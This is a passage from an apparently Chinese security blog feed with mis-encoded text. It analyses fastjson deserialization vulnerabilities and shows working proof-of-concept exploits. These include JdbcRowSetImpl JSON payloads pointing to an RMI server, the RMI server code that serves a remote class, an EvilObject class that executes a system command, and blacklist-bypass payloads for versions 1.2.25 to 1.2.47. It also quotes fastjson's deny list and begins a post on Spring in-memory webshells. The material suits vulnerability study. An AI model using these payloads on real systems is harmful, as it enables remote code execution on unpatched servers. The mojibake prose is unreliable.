setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, &#123;&#125;);<span class="comment">//</span></span><br><span class="line">setFieldValue(obj,<span class="string">&quot;_outputProperties&quot;</span>,&#123;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p><code>_tfactory</code>ä¹Ÿå¯ä»¥ä¼ å…¥new TransformerFactoryImpl()ï¼Œ_tyfactoryä¸ºç©ºçš„è¯ä¼šæ ¹æ®ç±»å±æ€§è‡ªåŠ¨åˆ›å»ºTransformerFactoryImplå®ä¾‹ï¼Œä½†æ˜¯åªæœ‰ç”¨fastjson&#x2F;serializerè¿›è¡Œåºåˆ—åŒ–çš„æ—¶å€™å¯ä»¥ä¸ä¼ å…¥</p><p>å› ä¸ºæœ‰å»é™¤ä¸‹åˆ’çº¿çš„æ“ä½œï¼Œå±æ€§éƒ½èƒ½åŠ ä¸Š<code>_</code>ã€‚æŒ‡å®šäº†allowedProtocols&#x3D;allï¼Œä¹Ÿå°±æ˜¯åºåˆ—åŒ–æ”¯æŒçš„åè®®</p><p>å¼¹è®¡ç®—å™¨å›¾ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217222126890.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217222126890.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å…³äºfastjsonååºåˆ—åŒ–è°ƒç”¨javaBeançš„setterã€getterã€æ„é€ å‡½æ•°è¯·çœ‹<a href="http://wjlshare.com/archives/1512%EF%BC%88%E4%B8%8D%E8%BF%87%E6%88%91%E4%B8%8D%E7%9C%8B">http://wjlshare.com/archives/1512ï¼ˆä¸è¿‡æˆ‘ä¸çœ‹</a></p><ul><li>æºç å¤§è‡´åŸç†:</li></ul><p>jsonåºåˆ—åŒ–å…¥å£ï¼šJSON.parseObject(),è½¬åˆ°DefaultJSONParser.parseObject(),è¯¥æ–¹æ³•ä¸‹çš„ä¸€ä¸ªifåˆ¤æ–­ï¼Œkey&#x3D;&#x3D;<code>JSON.DEFAULT_TYPE_KEY</code> åŒæ—¶ æ²¡æœ‰å¼€å¯<code>Feature.DisableSpecialKeyDetect</code> å°±ä¼šè¿›å…¥åˆ¤æ–­ï¼Œåˆ©ç”¨loadClassï¼ŒåŠ è½½ç±»å¯¹è±¡</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221219204845168.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221219204845168.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ParserConfig.getDeserializer()ç»è¿‡ä¸€ç³»åˆ—çš„åˆ¤æ–­ï¼Œç”±äºTemplatesImplç±»éƒ½ä¸åœ¨ifåˆ¤æ–­çš„æ¡ä»¶èŒƒå›´å†…ï¼Œæ‰€ä»¥ä¼šåˆ›å»ºä¸€ä¸ª<code>JavaBeanDeserializer</code>ã€‚éƒ½è·å–åˆ°äº†å¯¹åº”çš„ååºåˆ—åŒ–å™¨ä¹‹åï¼Œæ­£å¼å¼€å§‹è¿›è¡Œååºåˆ—åŒ–ã€‚</p><p><code>JavaBeanDeserializer.parseField()</code> æ–¹æ³•ä¸­åˆ©ç”¨smartMatchå¯¹æˆ‘ä»¬ä¼ å…¥çš„å±æ€§è¿›è¡Œäº†æ¨¡ç³ŠåŒ¹é…</p><p>ç„¶åè°ƒç”¨<code>getFieldDeserializer</code>ï¼Œåœ¨<code>sortedFieldDeserializers</code> ä¸­æ‰¾åˆ°<code>getOutputProperties</code> æ–¹æ³•ï¼Œå¹¶ä¸”è¿›è¡Œè¿”å›</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221219204300688.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221219204300688.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç„¶åè°ƒç”¨åå°„è§¦å‘getOutputProperties,è¿›è€Œè½¬åˆ°TemplatesImplé“¾</p><h4 id="fastjson1-2-24ä¿®å¤"><a href="#fastjson1-2-24ä¿®å¤" class="headerlink" title="fastjson1.2.24ä¿®å¤"></a>fastjson1.2.24ä¿®å¤</h4><p>åœ¨DefaultJSONParser.parseObjectä¸­å°†åŠ è½½ç±»çš„<code>TypeUtils.loadClass</code>æ–¹æ³•æ›¿æ¢ä¸ºäº†<code>this.config.checkAutoType()</code>æ–¹æ³•ã€‚å¹¶åœ¨æ­¤æ–¹æ³•å¢åŠ äº†ç™½åå•+é»‘åå•ï¼Œä»¥ä¸‹ç±»ä¼ å…¥parseObjectéƒ½ä¼šè¢«ç¦</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bsh</span><br><span class="line">com<span class="selector-class">.mchange</span></span><br><span class="line">com<span class="selector-class">.sun</span>.</span><br><span class="line">java<span class="selector-class">.lang</span><span class="selector-class">.Thread</span></span><br><span class="line">java<span class="selector-class">.net</span><span class="selector-class">.Socket</span></span><br><span class="line">java<span class="selector-class">.rmi</span></span><br><span class="line">javax<span class="selector-class">.xml</span></span><br><span class="line">org<span class="selector-class">.apache</span><span class="selector-class">.bcel</span></span><br><span class="line">org<span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.beanutils</span></span><br><span class="line">org<span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections</span><span class="selector-class">.Transformer</span></span><br><span class="line">org<span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections</span><span class="selector-class">.functors</span></span><br><span class="line">org<span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections4</span><span class="selector-class">.comparators</span></span><br><span class="line">org<span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.fileupload</span></span><br><span class="line">org<span class="selector-class">.apache</span><span class="selector-class">.myfaces</span><span class="selector-class">.context</span><span class="selector-class">.servlet</span></span><br><span class="line">org<span class="selector-class">.apache</span><span class="selector-class">.tomcat</span></span><br><span class="line">org<span class="selector-class">.apache</span><span class="selector-class">.wicket</span><span class="selector-class">.util</span></span><br><span class="line">org<span class="selector-class">.codehaus</span><span class="selector-class">.groovy</span><span class="selector-class">.runtime</span></span><br><span class="line">org<span class="selector-class">.hibernate</span></span><br><span class="line">org<span class="selector-class">.jboss</span></span><br><span class="line">org<span class="selector-class">.mozilla</span><span class="selector-class">.javascript</span></span><br><span class="line">org<span class="selector-class">.python</span><span class="selector-class">.core</span></span><br><span class="line">org<span class="selector-class">.springframework</span></span><br></pre></td></tr></table></figure><h2 id="fastjson-jdbcRowSetImplé“¾"><a href="#fastjson-jdbcRowSetImplé“¾" class="headerlink" title="fastjson jdbcRowSetImplé“¾"></a>fastjson jdbcRowSetImplé“¾</h2><p>ç‰ˆæœ¬ï¼šfastjson&lt;&#x3D;1.2.24</p><p>åˆšæ‰è®²çš„fastJson TemplatesImplé“¾éœ€è¦è®¾ç½®Feature.SupportNonPublicFieldã€‚æ¡ä»¶å¤ªè¿‡è‹›åˆ»ã€‚</p><p>POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> fastjsonvuln.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FJPoC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">PoC</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/refObj\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(PoC);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RMI Serverï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">refObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;whatever&quot;</span>, <span class="string">&quot;EvilObject&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">        System.out.println(refObj);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">refObjWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(refObj);</span><br><span class="line">        registry.bind(<span class="string">&quot;refObj&quot;</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¶æ„ç±»Evil:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilObject</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilObject</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>æºç å¤§è‡´åˆ†æï¼š</li></ul><p>ååºåˆ—åŒ–å…¥å£ä¹Ÿå°±æ˜¯JSON.parse()</p><p>è‡ªåŠ¨è°ƒç”¨@typeæŒ‡å®šç±»çš„setterï¼Œè¿™é‡ŒæŒ‡å®šçš„ç±»ä¸º<code>com.sun.rowset.JdbcRowSetImpl</code>ï¼Œåœ¨è¯¥ç±»ä¸‹æœ‰setAutoCommit()æ–¹æ³•ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220151427760.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220151427760.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>setAutoCommitæ–¹æ³•è°ƒç”¨äº†connectå‡½æ•°ï¼Œåœ¨connectå‡½æ•°ä¸­ï¼Œå¯ä»¥çœ‹åˆ°jndiçš„åˆå§‹åŒ–<code>InitialContext()</code>ï¼Œç„¶å<code>lookup(this.getDataSourceName())</code>ã€‚å¦‚æœè¿™é‡Œçš„dataSourceæ˜¯å¯æ§çš„ï¼ˆè¿™é‡Œå¯ä»¥ç›´æ¥è®¾ç½®dataSourceNameï¼‰ï¼Œå°±èƒ½è§¦å‘jndiæ³¨å…¥</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220151835059.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220151835059.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220152215928.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220152215928.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><blockquote><p>1.TemplatesImpl é“¾ </p><ul><li>ä¼˜ç‚¹ï¼šå½“fastjsonä¸å‡ºç½‘çš„æ—¶å€™å¯ä»¥ç›´æ¥è¿›è¡Œç›²æ‰“ï¼ˆé…åˆæ—¶å»¶çš„å‘½ä»¤æ¥åˆ¤æ–­å‘½ä»¤æ˜¯å¦æ‰§è¡ŒæˆåŠŸï¼‰ </li><li>ç¼ºç‚¹ï¼šç‰ˆæœ¬é™åˆ¶  1.2.22 èµ·æ‰æœ‰ SupportNonPublicField ç‰¹æ€§ï¼Œå¹¶ä¸”åç«¯å¼€å‘éœ€è¦ç‰¹å®šè¯­å¥æ‰èƒ½å¤Ÿè§¦å‘ï¼Œåœ¨ä½¿ç”¨parseObject  çš„æ—¶å€™ï¼Œå¿…é¡»è¦ä½¿ç”¨ JSON.parseObject(input, Object.class,  Feature.SupportNonPublicField)</li></ul><p>2.JdbcRowSetImpl é“¾ </p><ul><li>ä¼˜ç‚¹ï¼šåˆ©ç”¨èŒƒå›´æ›´å¹¿ï¼Œè§¦å‘æ›´ä¸ºå®¹æ˜“ </li><li>ç¼ºç‚¹ï¼šå½“fastjson  ä¸å‡ºç½‘çš„è¯è¿™ä¸ªæ–¹æ³•åŸºæœ¬ä¸Šä¸è¡Œï¼ˆåœ¨å®é™…è¿‡ç¨‹ä¸­é‡åˆ°äº†å¾ˆå¤šä¸å‡ºç½‘çš„æƒ…å†µï¼‰åŒæ—¶é«˜ç‰ˆæœ¬jdkä¸­codebaseé»˜è®¤ä¸ºtrueï¼Œè¿™æ ·æ„å‘³ç€ï¼Œæˆ‘ä»¬åªèƒ½åŠ è½½å—ä¿¡ä»»çš„åœ°å€</li></ul></blockquote><h2 id="fastjsonåç»­ä¿®å¤"><a href="#fastjsonåç»­ä¿®å¤" class="headerlink" title="fastjsonåç»­ä¿®å¤"></a>fastjsonåç»­ä¿®å¤</h2><ol><li>è‡ªä»1.2.25 èµ· autotype é»˜è®¤å…³é—­</li><li>å¢åŠ  checkAutoType æ–¹æ³•ï¼Œåœ¨è¯¥æ–¹æ³•ä¸­æ‰©å……é»‘åå•ï¼ŒåŒæ—¶å¢åŠ ç™½åå•æœºåˆ¶</li></ol><p>é»‘åå•æ‰©å……äº†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework&quot;</span></span><br></pre></td></tr></table></figure><ul><li>1.2.25-1.2.41 poc</li></ul><p>ç”±äºautotypeé»˜è®¤å…³é—­ï¼Œåœ¨pocä¹‹å‰å¼€å¯autotype:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">ParserConfig</span>.<span class="title function_">getGlobalInstance</span>().<span class="title function_">setAutoTypeSupport</span>(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>åœ¨æ–°å¢çš„checkAutoTypeï¼ŒæŒ‡å‘çš„TypeUtils.loadClass()æ–¹æ³•å¯¹ä¼ å…¥ç±»è¿›è¡Œäº†è¿‡æ»¤ï¼Œå¼€å¤´ä¸º&#96;<a href="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220172914052.png"></a></p><p>pocï¼š&#96;{&quot;@type&quot;:&quot;<a href="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220173631690.png"></a></p><p>å°†æ–¹æ³•hashåä¸denyHashCodesï¼ˆé»‘åå•hashè¡¨ï¼‰å¯¹æ¯”</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220173714814.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220173714814.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>çœ‹èµ·æ¥ä¿®å¤äº†ï¼Œå…¶å®åŠ å¯†hashæ‰€ç”¨çš„ç®—æ³•èƒ½é€šè¿‡æºç çœ‹åˆ°ï¼š</p><p>å°†ç±»æ·»åŠ è‡³å­—å…¸addDeny:  å¯ä»¥çœ‹åˆ°ä½¿ç”¨çš„åŠ å¯†æ–¹æ³•ä¸º<code>TypeUtils.fnv1a_64()</code></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220174430002.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220174430002.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>fnv1a_64():</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220174614320.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220174614320.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>githubé¡¹ç›®ï¼Œç”¨hashç¢°æ’æ±‚å‡ºé»‘åå•hashå¯¹åº”çš„ç±»ï¼š<a href="https://github.com/LeadroyaL/fastjson-blacklist%E3%80%82%E7%BB%93%E6%9E%9C%E5%8F%91%E7%8E%B0%EF%BC%8C%EF%BC%8C%E5%B9%B6%E6%B2%A1%E6%9C%89JdbcRowSetImpl">https://github.com/LeadroyaL/fastjson-blacklistã€‚ç»“æœå‘ç°ï¼Œï¼Œå¹¶æ²¡æœ‰JdbcRowSetImpl</a></p><p>pocä¹Ÿåªç”¨åŠ åŒå†™<code>L ;</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://127.0.0.1:1099/refObj&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>1.2.43ä¿®å¤ï¼šå¯¹åŒå†™è¿›è¡Œäº†è¿‡æ»¤</p><p>1.2.45ä¿®å¤ï¼šæ‰©å……é»‘åå•</p><h2 id="fastjson1-2-25-1-2-47é€šæ€"><a href="#fastjson1-2-25-1-2-47é€šæ€" class="headerlink" title="fastjson1.2.25-1.2.47é€šæ€"></a>fastjson1.2.25-1.2.47é€šæ€</h2><p>POCï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://localhost:1099/refObj&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>è¯¥pocæ— è§†checkAutoTypeï¼Œè¿˜è®°å¾—checkAutoTypeé‡Œå°†æ–¹æ³•hashä¸é»‘åå•hashå¯¹æ¯”å—ï¼Œ&amp;&amp;åé¢è¿˜åŠ å…¥äº†<code>getClassFromMapping()==null</code>åˆ¤æ–­</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220173714814.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220173714814.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>æºç åˆ†æï¼š</li></ul><p>DefaultJSONParser#parserä¸­è°ƒç”¨äº†MiscCodec#deserialzeæ–¹æ³•</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220192354318.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220192354318.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">åœ¨MiscCodecä¸­å¯¹ç±»è¿›è¡Œäº†åˆ¤æ–­ï¼Œå¦‚æœä¸ºjava.lang.Classç±»ï¼Œä¼šè°ƒç”¨TypeUtils#loadClassæ¥åŠ è½½æ¶æ„ç±»ï¼Œæ‰€ä»¥ä¼ å…¥ç±»éœ€è¦ä¸ºjava.lang.Class</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220190026560.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220190026560.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨ä¸ä¼ å…¥java.lang.Classçš„loadClass:</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220194431803.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220194431803.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¯ä»¥çœ‹åˆ°cacheå€¼ä¸ºfalse</p><p>åœ¨MiscCodecä¸­è°ƒç”¨çš„loadClasså¹¶æœªä¼ å…¥cacheå€¼ï¼Œè€Œè¯¥å€¼é»˜è®¤trueã€‚æ‰€ä»¥é¡ºåˆ©è¿›å…¥if(cache)åˆ¤æ–­é‡Œï¼Œå°†(className,clazz) putè¿›mappingsã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220194803616.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220194803616.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿™ä¸ªæ—¶å€™å›åˆ°æœ€å¼€å§‹çš„<code>getClassFromMapping()==null</code>ï¼Œè¿”å›falseï¼Œå°±ç»•è¿‡äº†é»‘åå•æ£€æµ‹</p><p>1.2.48ä¿®å¤ï¼šå°†cacheé»˜è®¤è®¾ç½®ä¸ºfalse</p><p>å‚è€ƒï¼š<a href="http://wjlshare.com/archives/1526">http://wjlshare.com/archives/1526</a></p><p><a href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html">https://kingx.me/Exploit-Java-Deserialization-with-RMI.html</a></p><p><a href="https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/">https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> æ¡†æ¶æ¼æ´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>springå†…å­˜é©¬â€”â€”Controller&amp;Interceptor</title>
      <link href="/2022/12/29/spring-nei-cun-ma-controller-interceptor/"/>
      <url>/2022/12/29/spring-nei-cun-ma-controller-interceptor/</url>
      
        <content type="html"><![CDATA[<h1 id="Springå†…å­˜é©¬"><a href="#Springå†…å­˜é©¬" class="headerlink" title="Springå†…å­˜é©¬"></a>Springå†…å­˜é©¬</h1><p>Springæ˜¯IOCå’ŒAOPçš„å®¹å™¨æ¡†æ¶ï¼ŒSpringMVCåˆ™æ˜¯åŸºäºSpringåŠŸèƒ½çš„Webæ¡†æ¶ã€‚</p><ul><li><p>IOCå®¹å™¨ï¼šIOCå®¹å™¨è´Ÿè´£å®ä¾‹åŒ–ã€å®šä½ã€é…ç½®åº”ç”¨ç¨‹åºå¯¹è±¡åŠå»ºç«‹å¯¹è±¡ä¾èµ–ã€‚Springä¸­ç”¨BeanFactoryå®ç°</p></li><li><p>Springä½œä¸ºJavaæ¡†æ¶ï¼Œæ ¸å¿ƒç»„ä»¶æœ‰ä¸‰ä¸ªï¼šCoreã€Contextã€Beanã€‚å…¶ä¸­contextåˆå«IOCå®¹å™¨ï¼›Beanæ„æˆåº”ç”¨ç¨‹åºä¸»å¹²ï¼ŒBeanå°±æ˜¯å¯¹è±¡ï¼Œç”±IOCå®¹å™¨ç»Ÿä¸€ç®¡ç†ï¼›Coreä¸ºå¤„ç†å¯¹è±¡é—´å…³ç³»çš„æ–¹æ³•</p></li></ul><blockquote><p>ä¾èµ–æ³¨å…¥ï¼šæŠŠæœ‰ä¾èµ–å…³ç³»çš„ç±»æ”¾åˆ°å®¹å™¨ä¸­ï¼Œè§£æå‡ºè¿™äº›ç±»çš„å®ä¾‹</p></blockquote><p>springå¯¹è±¡é—´çš„ä¾èµ–å…³ç³»å¯ä»¥ç”¨é…ç½®æ–‡ä»¶çš„<code>&lt;bean&gt;</code>å®šä¹‰ã€‚contextçš„é¡¶çº§çˆ¶ç±»ApplicationContextç»§æ‰¿äº†BeanFactoryã€‚</p><p>å†…å­˜é©¬ä¸€èˆ¬çš„æ„é€ æ–¹å¼å°±æ˜¯æ¨¡æ‹Ÿç»„ä»¶æ³¨å†Œï¼Œæ³¨å…¥æ¶æ„ç»„ä»¶</p><h2 id="springMVCç¯å¢ƒæ­å»º"><a href="#springMVCç¯å¢ƒæ­å»º" class="headerlink" title="springMVCç¯å¢ƒæ­å»º"></a>springMVCç¯å¢ƒæ­å»º</h2><p>æ–°å»ºmavené¡¹ç›®ï¼Œé¡¹ç›®åå³é”®æ·»åŠ webæ¡†æ¶</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230113155144100.png" class="lazyload placeholder" 